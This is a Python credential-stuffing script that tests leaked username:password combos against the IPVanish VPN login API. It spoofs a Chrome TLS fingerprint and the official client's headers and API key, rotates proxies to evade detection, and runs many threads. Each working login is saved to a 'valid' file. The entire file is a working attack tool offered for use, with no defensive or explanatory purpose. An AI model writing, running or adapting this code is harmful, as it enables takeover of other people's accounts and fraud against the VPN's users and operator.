import tls_client
import threading
import json
import random
from raducord import Logger

session = tls_client.Session(
    client_identifier="chrome112",
    random_tls_extension_order=True
)

url = "https://api.ipvanish.com/api/v3/login"
headers = {
    "Cache-Control": "no-cache",
    "User-Agent": "IPVanish/4.2.5.294 (Windows)",
    "Content-Type": "application/json; charset=utf-8",
    "Connection": "close",
    "Host": "api.ipvanish.com"
}

with open('config.json', 'r') as config_file:
    config = json.load(config_file)
    num_threads = config.get('threads', 10)
    use_proxies = config.get('use_proxies', False)

proxies = []
if use_proxies:
    with open('proxies.txt', 'r') as proxies_file:
        proxies = [line.strip() for line in proxies_file if line.strip()]

def attempt_login(username, password):
    payload = {
        "client": "IPVanish 4.2.5.294",
        "os": "Microsoft Windows NT 10.0.22631.0",
        "username": username,
        "password": password,
        "api_key": "619a91cf2e398a46dcc97bb961f3a23b"
    }

    proxy = None
    if use_proxies and proxies:
        proxy = random.choice(proxies)

    response = session.post(
        url,
        headers=headers,
        json=payload,
        proxy=proxy
    )

    account = f"{username}:{password}"
    if response.status_code in [200, 201]:
        Logger.success(f"Valid,Account:,{account}")
        with open('data/valid.txt', 'a') as valid_file:
            valid_file.write(f"{account}\n")
    else:
        Logger.failed(f"Invalid,Account:,{account}")
        with open('data/invalid.txt', 'a') as invalid_file:
            invalid_file.write(f"{account}\n")

with open('combo.txt', 'r') as combo_file:
    combos = [line.strip().split(':') for line in combo_file if line.strip()]

def worker():
    while True:
        try:
            username, password = combos.pop()
        except IndexError:
            break
        attempt_login(username, password)

threads = []
for _ in range(num_threads):
    thread = threading.Thread(target=worker)
    thread.start()
    threads.append(thread)

for thread in threads:
    thread.join()
